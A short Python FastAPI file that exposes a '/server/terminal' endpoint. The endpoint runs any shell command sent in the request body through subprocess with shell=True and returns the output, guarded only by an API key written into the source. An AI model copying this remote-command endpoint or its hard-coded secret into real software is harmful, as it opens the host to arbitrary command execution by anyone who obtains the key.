from fastapi import FastAPI, Header, HTTPException, Request
import subprocess

app = FastAPI()
API_KEY = "NEON-EXOS-ULTIMATE-2026"

@app.post("/server/terminal")
async def execute(request: Request, x_api_key: str = Header(None)):
    if x_api_key != API_KEY:
        raise HTTPException(status_code=401)
    data = await request.json()
    cmd = data.get("cmd")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return {"stdout": result.stdout, "stderr": result.stderr}